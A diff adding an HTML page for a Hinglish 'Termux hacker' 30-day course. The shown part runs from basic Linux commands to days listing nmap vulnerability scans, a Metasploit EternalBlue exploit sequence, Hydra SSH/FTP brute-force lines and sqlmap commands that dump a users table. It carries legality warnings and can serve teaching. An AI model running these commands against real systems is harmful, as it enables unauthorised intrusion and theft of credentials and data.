@@ -1,0 +1,1367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>TERMUX HACKER — 30 Days</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
+
+  :root {
+    --green: #00ff41;
+    --dark-green: #00b32c;
+    --dim-green: #003b10;
+    --bg: #0a0a0a;
+    --card-bg: #0d1a0d;
+    --border: #00ff4133;
+    --red: #ff003c;
+    --cyan: #00fff9;
+    --yellow: #ffe600;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ─── MATRIX RAIN CANVAS ─── */
+  #matrix-canvas {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 0;
+    opacity: 0.07;
+    pointer-events: none;
+  }
+
+  /* ─── SCANLINE OVERLAY ─── */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,65,0.015) 2px,
+      rgba(0,255,65,0.015) 4px
+    );
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  /* ─── WRAPPER ─── */
+  .app-wrapper {
+    position: relative;
+    z-index: 2;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 16px 60px;
+  }
+
+  /* ─── HEADER ─── */
+  header {
+    text-align: center;
+    padding: 36px 0 20px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 28px;
+  }
+
+  .logo-glitch {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(1.6rem, 5vw, 2.8rem);
+    font-weight: 900;
+    color: var(--green);
+    letter-spacing: 4px;
+    text-shadow:
+      0 0 8px var(--green),
+      0 0 20px var(--green),
+      0 0 40px var(--dark-green);
+    animation: glitch 3s infinite;
+    position: relative;
+  }
+
+  .logo-glitch::before,
+  .logo-glitch::after {
+    content: attr(data-text);
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%;
+  }
+  .logo-glitch::before {
+    color: var(--cyan);
+    animation: glitch-1 3s infinite;
+    clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
+    opacity: 0.7;
+  }
+  .logo-glitch::after {
+    color: var(--red);
+    animation: glitch-2 3s infinite;
+    clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
+    opacity: 0.7;
+  }
+
+  @keyframes glitch {
+    0%,90%,100% { transform: none; }
+    91% { transform: skewX(-1deg); }
+    93% { transform: skewX(1deg); }
+    95% { transform: none; }
+  }
+  @keyframes glitch-1 {
+    0%,90%,100% { transform: none; }
+    91% { transform: translate(-3px, -1px); }
+    93% { transform: translate(3px, 1px); }
+  }
+  @keyframes glitch-2 {
+    0%,90%,100% { transform: none; }
+    91% { transform: translate(3px, 1px); }
+    93% { transform: translate(-3px, -1px); }
+  }
+
+  .header-sub {
+    font-size: 0.78rem;
+    color: var(--dark-green);
+    letter-spacing: 6px;
+    margin-top: 8px;
+  }
+
+  .header-badges {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-top: 14px;
+    flex-wrap: wrap;
+  }
+
+  .badge {
+    font-size: 0.65rem;
+    padding: 4px 12px;
+    border: 1px solid var(--green);
+    color: var(--green);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    background: rgba(0,255,65,0.07);
+    border-radius: 2px;
+    animation: pulse-border 2s infinite;
+  }
+  .badge.red { border-color: var(--red); color: var(--red); background: rgba(255,0,60,0.07); }
+  .badge.cyan { border-color: var(--cyan); color: var(--cyan); background: rgba(0,255,249,0.07); }
+
+  @keyframes pulse-border {
+    0%,100% { box-shadow: 0 0 4px currentColor; }
+    50% { box-shadow: 0 0 12px currentColor; }
+  }
+
+  /* ─── TERMINAL PROMPT ─── */
+  .terminal-bar {
+    background: #0d1a0d;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 10px 16px;
+    margin-bottom: 24px;
+    font-size: 0.82rem;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    overflow: hidden;
+  }
+  .terminal-bar .prompt { color: var(--red); font-weight: bold; }
+  .terminal-bar .path { color: var(--cyan); }
+  .terminal-bar .cmd { color: var(--green); }
+  .terminal-bar .cursor {
+    display: inline-block;
+    width: 9px; height: 15px;
+    background: var(--green);
+    animation: blink 1s step-end infinite;
+    margin-left: 2px;
+    vertical-align: middle;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+  /* ─── PROGRESS SECTION ─── */
+  .progress-wrap {
+    background: var(--card-bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px 20px;
+    margin-bottom: 26px;
+  }
+  .progress-header {
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.75rem;
+    margin-bottom: 10px;
+    color: var(--dark-green);
+    letter-spacing: 2px;
+  }
+  .progress-bar-outer {
+    height: 8px;
+    background: #001a08;
+    border-radius: 4px;
+    overflow: hidden;
+    border: 1px solid var(--dim-green);
+  }
+  .progress-bar-inner {
+    height: 100%;
+    background: linear-gradient(90deg, var(--dark-green), var(--green));
+    border-radius: 4px;
+    transition: width 0.4s ease;
+    box-shadow: 0 0 10px var(--green);
+    width: 0%;
+  }
+  .progress-stats {
+    display: flex;
+    gap: 20px;
+    margin-top: 12px;
+    flex-wrap: wrap;
+  }
+  .stat {
+    font-size: 0.7rem;
+    color: var(--dim-green);
+  }
+  .stat span { color: var(--green); font-size: 0.9rem; }
+
+  /* ─── SEARCH ─── */
+  .search-wrap {
+    position: relative;
+    margin-bottom: 24px;
+  }
+  .search-wrap input {
+    width: 100%;
+    background: var(--card-bg);
+    border: 1px solid var(--border);
+    color: var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.85rem;
+    padding: 12px 16px 12px 42px;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.3s, box-shadow 0.3s;
+    letter-spacing: 1px;
+  }
+  .search-wrap input:focus {
+    border-color: var(--green);
+    box-shadow: 0 0 15px rgba(0,255,65,0.2);
+  }
+  .search-wrap input::placeholder { color: #1a4a1a; }
+  .search-icon {
+    position: absolute;
+    left: 14px; top: 50%;
+    transform: translateY(-50%);
+    color: var(--dark-green);
+    font-size: 1rem;
+  }
+
+  /* ─── FILTER TABS ─── */
+  .filter-tabs {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 24px;
+    flex-wrap: wrap;
+  }
+  .filter-tab {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.72rem;
+    padding: 6px 14px;
+    border: 1px solid #1a4a1a;
+    background: transparent;
+    color: #1a6a1a;
+    cursor: pointer;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-radius: 2px;
+    transition: all 0.2s;
+  }
+  .filter-tab:hover,
+  .filter-tab.active {
+    border-color: var(--green);
+    color: var(--green);
+    background: rgba(0,255,65,0.08);
+    box-shadow: 0 0 8px rgba(0,255,65,0.3);
+  }
+  .filter-tab.active { box-shadow: 0 0 14px rgba(0,255,65,0.4); }
+
+  /* ─── DAY CARDS ─── */
+  .days-grid {
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+
+  .day-card {
+    background: var(--card-bg);
+    border: 1px solid #0d2e0d;
+    border-radius: 6px;
+    overflow: hidden;
+    transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
+    cursor: pointer;
+  }
+  .day-card:hover {
+    border-color: var(--green);
+    box-shadow: 0 0 20px rgba(0,255,65,0.15), inset 0 0 30px rgba(0,255,65,0.03);
+    transform: translateX(3px);
+  }
+  .day-card.completed { border-color: #00552a; }
+  .day-card.completed .day-header { background: rgba(0,255,65,0.05); }
+
+  .day-header {
+    display: flex;
+    align-items: center;
+    padding: 14px 18px;
+    gap: 14px;
+    user-select: none;
+  }
+
+  .day-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 0.7rem;
+    font-weight: 700;
+    color: var(--bg);
+    background: var(--green);
+    padding: 4px 8px;
+    border-radius: 3px;
+    letter-spacing: 1px;
+    min-width: 54px;
+    text-align: center;
+    box-shadow: 0 0 10px var(--green);
+    flex-shrink: 0;
+  }
+  .day-card.completed .day-num { background: var(--dark-green); }
+
+  .day-meta { flex: 1; min-width: 0; }
+  .day-title {
+    font-size: 0.9rem;
+    color: var(--green);
+    letter-spacing: 1px;
+    margin-bottom: 3px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .day-subtitle {
+    font-size: 0.68rem;
+    color: #1a6a1a;
+    letter-spacing: 1px;
+  }
+
+  .day-right {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    flex-shrink: 0;
+  }
+
+  .level-badge {
+    font-size: 0.6rem;
+    padding: 3px 8px;
+    border-radius: 2px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border: 1px solid;
+  }
+  .level-badge.basic { border-color: var(--cyan); color: var(--cyan); background: rgba(0,255,249,0.08); }
+  .level-badge.intermediate { border-color: var(--yellow); color: var(--yellow); background: rgba(255,230,0,0.08); }
+  .level-badge.advanced { border-color: var(--red); color: var(--red); background: rgba(255,0,60,0.08); }
+  .level-badge.expert { border-color: #ff6600; color: #ff6600; background: rgba(255,102,0,0.08); }
+
+  .check-btn {
+    width: 28px; height: 28px;
+    border: 1px solid #1a4a1a;
+    background: transparent;
+    border-radius: 50%;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 0.8rem;
+    transition: all 0.2s;
+    flex-shrink: 0;
+  }
+  .check-btn:hover { border-color: var(--green); background: rgba(0,255,65,0.1); }
+  .day-card.completed .check-btn {
+    border-color: var(--green);
+    background: rgba(0,255,65,0.15);
+    box-shadow: 0 0 8px rgba(0,255,65,0.4);
+  }
+
+  .expand-icon {
+    color: var(--dark-green);
+    font-size: 0.8rem;
+    transition: transform 0.3s;
+    flex-shrink: 0;
+  }
+  .day-card.open .expand-icon { transform: rotate(180deg); color: var(--green); }
+
+  /* ─── DAY CONTENT ─── */
+  .day-content {
+    display: none;
+    border-top: 1px solid #0d2e0d;
+    padding: 20px 18px;
+    animation: fadeIn 0.2s ease;
+  }
+  .day-card.open .day-content { display: block; }
+
+  @keyframes fadeIn { from { opacity:0; transform: translateY(-6px); } to { opacity:1; transform: none; } }
+
+  .content-section { margin-bottom: 20px; }
+  .section-label {
+    font-size: 0.65rem;
+    letter-spacing: 3px;
+    color: var(--dark-green);
+    text-transform: uppercase;
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .section-label::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, #0d2e0d, transparent);
+  }
+
+  .desc-text {
+    font-size: 0.82rem;
+    color: #4a9a4a;
+    line-height: 1.7;
+    margin-bottom: 14px;
+  }
+
+  /* ─── COMMAND BLOCKS ─── */
+  .cmd-list { display: flex; flex-direction: column; gap: 8px; }
+
+  .cmd-item {
+    background: #060f06;
+    border: 1px solid #0d2e0d;
+    border-left: 3px solid var(--green);
+    border-radius: 3px;
+    padding: 10px 14px;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    transition: background 0.2s, border-left-color 0.2s;
+    cursor: pointer;
+    position: relative;
+  }
+  .cmd-item:hover {
+    background: #0a1a0a;
+    border-left-color: var(--cyan);
+  }
+  .cmd-item:hover .copy-hint { opacity: 1; }
+  .cmd-item.cyan-border { border-left-color: var(--cyan); }
+  .cmd-item.yellow-border { border-left-color: var(--yellow); }
+  .cmd-item.red-border { border-left-color: var(--red); }
+
+  .cmd-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.82rem;
+    color: var(--green);
+    flex: 1;
+    word-break: break-all;
+  }
+  .cmd-text .dollar { color: var(--red); margin-right: 6px; }
+  .cmd-text .comment {
+    display: block;
+    font-size: 0.72rem;
+    color: #2a5a2a;
+    margin-top: 4px;
+  }
+
+  .copy-hint {
+    position: absolute;
+    right: 10px; top: 50%;
+    transform: translateY(-50%);
+    font-size: 0.6rem;
+    color: var(--cyan);
+    letter-spacing: 1px;
+    opacity: 0;
+    transition: opacity 0.2s;
+    pointer-events: none;
+  }
+
+  .copied-toast {
+    position: fixed;
+    bottom: 30px; right: 20px;
+    background: rgba(0,255,65,0.1);
+    border: 1px solid var(--green);
+    color: var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.78rem;
+    padding: 10px 20px;
+    border-radius: 4px;
+    z-index: 1000;
+    box-shadow: 0 0 20px rgba(0,255,65,0.3);
+    opacity: 0;
+    transition: opacity 0.3s;
+    letter-spacing: 2px;
+    pointer-events: none;
+  }
+  .copied-toast.show { opacity: 1; }
+
+  /* ─── TIPS ─── */
+  .tip-box {
+    background: rgba(0,255,249,0.04);
+    border: 1px solid rgba(0,255,249,0.2);
+    border-radius: 4px;
+    padding: 12px 14px;
+    font-size: 0.78rem;
+    color: var(--cyan);
+    line-height: 1.6;
+  }
+  .tip-box .tip-icon { margin-right: 8px; }
+
+  .warn-box {
+    background: rgba(255,0,60,0.04);
+    border: 1px solid rgba(255,0,60,0.25);
+    border-radius: 4px;
+    padding: 12px 14px;
+    font-size: 0.78rem;
+    color: var(--red);
+    line-height: 1.6;
+    margin-top: 8px;
+  }
+
+  /* ─── FOOTER ─── */
+  footer {
+    text-align: center;
+    padding: 30px 0;
+    font-size: 0.68rem;
+    color: #1a3a1a;
+    letter-spacing: 3px;
+    border-top: 1px solid #0d2e0d;
+    margin-top: 40px;
+  }
+  footer span { color: var(--dark-green); }
+
+  /* ─── SCROLLBAR ─── */
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: #003b10; border-radius: 4px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--dark-green); }
+
+  /* ─── RESPONSIVE ─── */
+  @media (max-width: 600px) {
+    .day-title { font-size: 0.82rem; }
+    .day-subtitle { display: none; }
+    .level-badge { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<canvas id="matrix-canvas"></canvas>
+
+<div class="app-wrapper">
+
+  <!-- HEADER -->
+  <header>
+    <div class="logo-glitch" data-text="TERMUX H4CKER">TERMUX H4CKER</div>
+    <div class="header-sub">[ 30 DAYS MASTERY PROGRAM ]</div>
+    <div class="header-badges">
+      <div class="badge">🔥 30 Days</div>
+      <div class="badge cyan">⚡ Basic → Expert</div>
+      <div class="badge red">☠️ No Limits</div>
+    </div>
+  </header>
+
+  <!-- TERMINAL BAR -->
+  <div class="terminal-bar">
+    <span class="prompt">root@kali</span>
+    <span style="color:#1a6a1a">:</span>
+    <span class="path">~/termux-mastery</span>
+    <span style="color:#1a6a1a">$</span>
+    <span class="cmd" id="typewriter"></span>
+    <span class="cursor"></span>
+  </div>
+
+  <!-- PROGRESS -->
+  <div class="progress-wrap">
+    <div class="progress-header">
+      <span>[ MISSION PROGRESS ]</span>
+      <span id="progress-pct">0%</span>
+    </div>
+    <div class="progress-bar-outer">
+      <div class="progress-bar-inner" id="progress-bar"></div>
+    </div>
+    <div class="progress-stats">
+      <div class="stat">Completed: <span id="stat-done">0</span></div>
+      <div class="stat">Remaining: <span id="stat-left">30</span></div>
+      <div class="stat">Streak: <span id="stat-streak">0</span>🔥</div>
+    </div>
+  </div>
+
+  <!-- SEARCH -->
+  <div class="search-wrap">
+    <span class="search-icon">🔍</span>
+    <input type="text" id="search-input" placeholder="Search commands, topics, days..." />
+  </div>
+
+  <!-- FILTER TABS -->
+  <div class="filter-tabs">
+    <button class="filter-tab active" data-filter="all">All Days</button>
+    <button class="filter-tab" data-filter="basic">Basic</button>
+    <button class="filter-tab" data-filter="intermediate">Intermediate</button>
+    <button class="filter-tab" data-filter="advanced">Advanced</button>
+    <button class="filter-tab" data-filter="expert">Expert</button>
+    <button class="filter-tab" data-filter="completed">Completed</button>
+  </div>
+
+  <!-- DAYS GRID -->
+  <div class="days-grid" id="days-grid"></div>
+
+  <footer>
+    TERMUX H4CKER &nbsp;|&nbsp; <span>30 DAYS MASTERY</span> &nbsp;|&nbsp; HACK THE PLANET ☠️
+  </footer>
+</div>
+
+<!-- COPY TOAST -->
+<div class="copied-toast" id="copy-toast">✓ COPIED TO CLIPBOARD</div>
+
+<script>
+// ═══════════════════════════════════════════════
+//  DATA — 30 DAYS FULL TERMUX TUTORIAL
+// ═══════════════════════════════════════════════
+const DAYS = [
+  {
+    day: 1, level: 'basic',
+    title: 'Termux Installation & First Boot',
+    subtitle: 'Setup, Update & Basic Navigation',
+    desc: 'Termux ek powerful terminal emulator hai Android ke liye. Pehle din hum install, update aur basic folder structure samjhenge.',
+    commands: [
+      { cmd: 'pkg update && pkg upgrade', comment: '// sabse pehle packages update karo' },
+      { cmd: 'pkg install git', comment: '// git install karo' },
+      { cmd: 'termux-setup-storage', comment: '// phone storage access do' },
+      { cmd: 'whoami', comment: '// current user dekho' },
+      { cmd: 'pwd', comment: '// current directory path' },
+      { cmd: 'ls', comment: '// files list karo' },
+      { cmd: 'ls -la', comment: '// hidden files ke saath list' },
+      { cmd: 'clear', comment: '// terminal saaf karo' },
+    ],
+    tip: '💡 Hamesha pehle "pkg update && pkg upgrade" run karo naye session mein.',
+    warn: '⚠️ F-Droid se download karo, Play Store wala outdated hai!'
+  },
+  {
+    day: 2, level: 'basic',
+    title: 'File System & Navigation',
+    subtitle: 'cd, ls, mkdir, rm, cp, mv commands',
+    desc: 'Linux file system ko navigate karna aur files/folders manage karna seekhenge.',
+    commands: [
+      { cmd: 'cd /sdcard', comment: '// phone storage mein jao' },
+      { cmd: 'cd ~', comment: '// home directory pe jao' },
+      { cmd: 'mkdir myhacks', comment: '// naya folder banao' },
+      { cmd: 'mkdir -p a/b/c', comment: '// nested folders ek saath' },
+      { cmd: 'touch file.txt', comment: '// empty file banao' },
+      { cmd: 'cp file.txt copy.txt', comment: '// file copy karo' },
+      { cmd: 'mv file.txt /sdcard/', comment: '// file move karo' },
+      { cmd: 'rm -rf foldername', comment: '// folder forcefully delete karo' },
+      { cmd: 'find / -name "*.txt" 2>/dev/null', comment: '// txt files search karo' },
+    ],
+    tip: '💡 Tab key se auto-complete hota hai command line mein.',
+    warn: '⚠️ rm -rf se dhyan se — yeh seedha delete karta hai, no trash!'
+  },
+  {
+    day: 3, level: 'basic',
+    title: 'Text Editing — Nano & Vim',
+    subtitle: 'File create, edit, save',
+    desc: 'Terminal mein text files edit karna — nano (easy) aur vim (powerful) dono seekhenge.',
+    commands: [
+      { cmd: 'pkg install nano vim', comment: '// editors install karo' },
+      { cmd: 'nano myfile.txt', comment: '// nano mein file kholo' },
+      { cmd: 'vim myfile.txt', comment: '// vim mein file kholo' },
+      { cmd: 'cat myfile.txt', comment: '// file content terminal pe dikhao' },
+      { cmd: 'head -5 file.txt', comment: '// pehli 5 lines dikhao' },
+      { cmd: 'tail -5 file.txt', comment: '// aakhri 5 lines dikhao' },
+      { cmd: 'grep "word" file.txt', comment: '// file mein word dhundho' },
+      { cmd: 'wc -l file.txt', comment: '// total lines count karo' },
+    ],
+    tip: '💡 Nano mein Ctrl+X se exit, Ctrl+S se save karo.',
+    warn: null
+  },
+  {
+    day: 4, level: 'basic',
+    title: 'Package Manager — PKG & APT',
+    subtitle: 'Install, Remove, Search packages',
+    desc: 'Termux ka apna package manager hai. Tools install, remove, search karna seekhenge.',
+    commands: [
+      { cmd: 'pkg list-all', comment: '// available sare packages dekho' },
+      { cmd: 'pkg list-installed', comment: '// installed packages dekho' },
+      { cmd: 'pkg search python', comment: '// python naam se search karo' },
+      { cmd: 'pkg install python', comment: '// python install karo' },
+      { cmd: 'pkg uninstall python', comment: '// python remove karo' },
+      { cmd: 'pkg reinstall nano', comment: '// nano reinstall karo' },
+      { cmd: 'apt-get autoremove', comment: '// unused packages clean karo' },
+      { cmd: 'pkg info git', comment: '// package ki info dekho' },
+    ],
+    tip: '💡 "pkg" faster hai "apt" se Termux mein.',
+    warn: null
+  },
+  {
+    day: 5, level: 'basic',
+    title: 'Bash Scripting — Basics',
+    subtitle: 'Variables, Echo, Scripts',
+    desc: 'Bash script likhna seekhenge — apna pehla automation script banana.',
+    commands: [
+      { cmd: 'echo "Hello Hacker!"', comment: '// text print karo' },
+      { cmd: 'name="hacker"; echo $name', comment: '// variable use karo' },
+      { cmd: 'echo $HOME', comment: '// home path dekho' },
+      { cmd: 'echo $PATH', comment: '// PATH variable dekho' },
+      { cmd: 'nano myscript.sh', comment: '// script file banao' },
+      { cmd: 'chmod +x myscript.sh', comment: '// execute permission do' },
+      { cmd: 'bash myscript.sh', comment: '// script run karo' },
+      { cmd: './myscript.sh', comment: '// direct run karo' },
+    ],
+    tip: '💡 Script ki pehli line honi chahiye: #!/bin/bash',
+    warn: null
+  },
+  {
+    day: 6, level: 'basic',
+    title: 'Networking Basics in Termux',
+    subtitle: 'ifconfig, ping, curl, wget',
+    desc: 'Network commands se IP, connectivity, aur data download karna seekhenge.',
+    commands: [
+      { cmd: 'pkg install net-tools curl wget', comment: '// networking tools install karo' },
+      { cmd: 'ifconfig', comment: '// network interfaces dekho' },
+      { cmd: 'ip addr', comment: '// IP address info' },
+      { cmd: 'ping -c 4 google.com', comment: '// 4 pings bhejo' },
+      { cmd: 'curl ifconfig.me', comment: '// apna public IP dekho' },
+      { cmd: 'wget https://example.com/file.zip', comment: '// file download karo' },
+      { cmd: 'curl -I https://google.com', comment: '// HTTP headers dekho' },
+      { cmd: 'traceroute google.com', comment: '// route trace karo' },
+    ],
+    tip: '💡 curl -o output.html URL se page save kar sakte ho.',
+    warn: null
+  },
+  {
+    day: 7, level: 'basic',
+    title: 'SSH — Remote Server Connect',
+    subtitle: 'SSH client, keygen, secure connect',
+    desc: 'SSH se remote servers pe connect karna aur secure communication seekhenge.',
+    commands: [
+      { cmd: 'pkg install openssh', comment: '// SSH install karo' },
+      { cmd: 'ssh user@192.168.1.1', comment: '// remote server connect karo' },
+      { cmd: 'ssh -p 2222 user@host', comment: '// custom port pe connect' },
+      { cmd: 'ssh-keygen -t rsa -b 4096', comment: '// RSA key pair generate karo' },
+      { cmd: 'ssh-copy-id user@server', comment: '// key server pe copy karo' },
+      { cmd: 'cat ~/.ssh/id_rsa.pub', comment: '// public key dekho' },
+      { cmd: 'scp file.txt user@host:/path/', comment: '// secure file copy karo' },
+      { cmd: 'ssh -L 8080:localhost:80 user@host', comment: '// port forwarding' },
+    ],
+    tip: '💡 SSH keys se password-less login possible hai.',
+    warn: '⚠️ Private key (~/.ssh/id_rsa) kisi se share mat karo!'
+  },
+  {
+    day: 8, level: 'intermediate',
+    title: 'Python in Termux',
+    subtitle: 'Python3, pip, scripts',
+    desc: 'Python install karke scripts likhna, pip packages use karna seekhenge.',
+    commands: [
+      { cmd: 'pkg install python', comment: '// python3 install karo' },
+      { cmd: 'python --version', comment: '// version check karo' },
+      { cmd: 'pip install requests', comment: '// requests library install karo' },
+      { cmd: 'pip install beautifulsoup4', comment: '// web scraping library' },
+      { cmd: 'python3 script.py', comment: '// python script run karo' },
+      { cmd: 'pip list', comment: '// installed pip packages dekho' },
+      { cmd: 'pip freeze > requirements.txt', comment: '// requirements save karo' },
+      { cmd: 'python3 -c "print(\'Hello Hacker\')"', comment: '// one-liner run karo' },
+    ],
+    tip: '💡 Virtual environment ke liye: python -m venv env && source env/bin/activate',
+    warn: null
+  },
+  {
+    day: 9, level: 'intermediate',
+    title: 'Git & GitHub — Version Control',
+    subtitle: 'clone, commit, push, pull',
+    desc: 'Git se code manage karna, GitHub pe push karna, tools clone karna seekhenge.',
+    commands: [
+      { cmd: 'git init', comment: '// naya repo initialize karo' },
+      { cmd: 'git clone https://github.com/user/repo', comment: '// repo clone karo' },
+      { cmd: 'git status', comment: '// changes dekho' },
+      { cmd: 'git add .', comment: '// sab files stage karo' },
+      { cmd: 'git commit -m "first hack"', comment: '// commit karo' },
+      { cmd: 'git push origin main', comment: '// GitHub pe push karo' },
+      { cmd: 'git pull origin main', comment: '// latest changes pull karo' },
+      { cmd: 'git log --oneline', comment: '// commit history dekho' },
+    ],
+    tip: '💡 git config --global user.email "your@email.com" pehle set karo.',
+    warn: null
+  },
+  {
+    day: 10, level: 'intermediate',
+    title: 'Nmap — Network Scanner',
+    subtitle: 'Port scanning & network recon',
+    desc: 'Nmap se network scan, port discovery, OS detection seekhenge.',
+    commands: [
+      { cmd: 'pkg install nmap', comment: '// nmap install karo' },
+      { cmd: 'nmap 192.168.1.1', comment: '// basic scan' },
+      { cmd: 'nmap -sV 192.168.1.1', comment: '// service version detect karo' },
+      { cmd: 'nmap -O 192.168.1.1', comment: '// OS detect karo' },
+      { cmd: 'nmap -p 1-1000 192.168.1.1', comment: '// specific port range scan' },
+      { cmd: 'nmap -sS 192.168.1.0/24', comment: '// full subnet scan' },
+      { cmd: 'nmap -A 192.168.1.1', comment: '// aggressive scan (all info)' },
+      { cmd: 'nmap --script vuln 192.168.1.1', comment: '// vulnerability scan' },
+    ],
+    tip: '💡 Sirf apne khud ke network pe use karo.',
+    warn: '⚠️ Kisi aur ke network ko scan karna illegal hai!'
+  },
+  {
+    day: 11, level: 'intermediate',
+    title: 'Metasploit Framework Setup',
+    subtitle: 'msfconsole on Termux via Kali',
+    desc: 'Metasploit ek powerful pen-testing framework hai. Termux mein setup karna seekhenge.',
+    commands: [
+      { cmd: 'pkg install unstable-repo', comment: '// unstable repo add karo' },
+      { cmd: 'pkg install metasploit', comment: '// metasploit install karo' },
+      { cmd: 'msfconsole', comment: '// metasploit start karo' },
+      { cmd: 'search ms17-010', comment: '// exploit dhundho' },
+      { cmd: 'use exploit/windows/smb/ms17_010_eternalblue', comment: '// exploit use karo' },
+      { cmd: 'show options', comment: '// options dekho' },
+      { cmd: 'set RHOSTS 192.168.1.1', comment: '// target set karo' },
+      { cmd: 'run', comment: '// exploit run karo' },
+    ],
+    tip: '💡 Sirf CTF/lab environment mein practice karo.',
+    warn: '⚠️ Real targets pe use karna strictly illegal hai!'
+  },
+  {
+    day: 12, level: 'intermediate',
+    title: 'Hydra — Password Cracking',
+    subtitle: 'Brute force SSH, FTP, HTTP',
+    desc: 'Hydra ek fast network login cracker hai. Lab setup mein password cracking seekhenge.',
+    commands: [
+      { cmd: 'pkg install hydra', comment: '// hydra install karo' },
+      { cmd: 'hydra -l admin -P wordlist.txt ssh://192.168.1.1', comment: '// SSH brute force' },
+      { cmd: 'hydra -l admin -P pass.txt ftp://192.168.1.1', comment: '// FTP attack' },
+      { cmd: 'hydra -l user -p pass http-get://192.168.1.1', comment: '// HTTP basic auth' },
+      { cmd: 'hydra -L users.txt -P pass.txt 192.168.1.1 ssh', comment: '// multiple users' },
+      { cmd: 'crunch 4 8 abc123 -o wordlist.txt', comment: '// custom wordlist banao' },
+      { cmd: 'pkg install wordlists', comment: '// built-in wordlists install' },
+    ],
+    tip: '💡 rockyou.txt sabse famous wordlist hai.',
+    warn: '⚠️ Only on systems you own or have permission!'
+  },
+  {
+    day: 13, level: 'intermediate',
+    title: 'Sqlmap — SQL Injection',
+    subtitle: 'Database testing & extraction',
+    desc: 'Sqlmap se SQL injection test karna, databases dump karna seekhenge.',
+    commands: [
+      { cmd: 'pip install sqlmap', comment: '// sqlmap install karo' },
+      { cmd: 'sqlmap -u "http://site.com?id=1"', comment: '// basic test' },
+      { cmd: 'sqlmap -u "http://site.com?id=1" --dbs', comment: '// databases list karo' },
+      { cmd: 'sqlmap -u "URL" -D dbname --tables', comment: '// tables dekho' },
+      { cmd: 'sqlmap -u "URL" -D db -T users --dump', comment: '// data dump karo' },
+      { cmd: 'sqlmap -u "URL" --forms', comment: '// forms auto-detect karo' },
+      { cmd: 'sqlmap -u "URL" --cookie="sessionid=abc"', comment: '// cookie use karo' },
+      { cmd: 'sqlmap -u "URL" --level=5 --risk=3', comment: '// aggressive test' },
+    ],
+    tip: '💡 --batch flag se auto-yes mode mein chalao.',
+    warn: '⚠️ CTF aur apni sites pe hi use karo!'
+  },
+  {
+    day: 14, level: 'intermediate',
+    title: 'Wireshark Alternative — tcpdump',
+    subtitle: 'Network packet capture & analysis',
+    desc: 'tcpdump se network traffic capture aur analyze karna seekhenge.',
+    commands: [
+      { cmd: 'pkg install tcpdump', comment: '// tcpdump install karo' },
+      { cmd: 'tcpdump -i wlan0', comment: '// wifi traffic capture karo' },
+      { cmd: 'tcpdump -i wlan0 -n port 80', comment: '// port 80 traffic dekho' },
+      { cmd: 'tcpdump -w capture.pcap', comment: '// file mein save karo' },
+      { cmd: 'tcpdump -r capture.pcap', comment: '// saved file read karo' },
+      { cmd: 'tcpdump host 192.168.1.1', comment: '// specific host filter' },
+      { cmd: 'tcpdump -i wlan0 -c 100', comment: '// sirf 100 packets capture' },
+    ],
+    tip: '💡 .pcap files Wireshark mein PC pe analyze kar sakte ho.',
+    warn: null
+  },
+  {
+    day: 15, level: 'intermediate',
+    title: 'Web Scraping with Python',
+    subtitle: 'requests + BeautifulSoup',
+    desc: 'Python se websites ki data extract karna, automated browsing seekhenge.',
+    commands: [
+      { cmd: 'pip install requests beautifulsoup4 lxml', comment: '// libraries install karo' },
+      { cmd: "python3 -c \"import requests; r=requests.get('https://httpbin.org/ip'); print(r.json())\"", comment: '// quick test' },
+      { cmd: 'pip install selenium', comment: '// selenium install karo' },
+      { cmd: 'pip install scrapy', comment: '// scrapy framework install' },
+      { cmd: 'scrapy startproject myproject', comment: '// scrapy project banao' },
+      { cmd: 'pip install mechanize', comment: '// form automation library' },
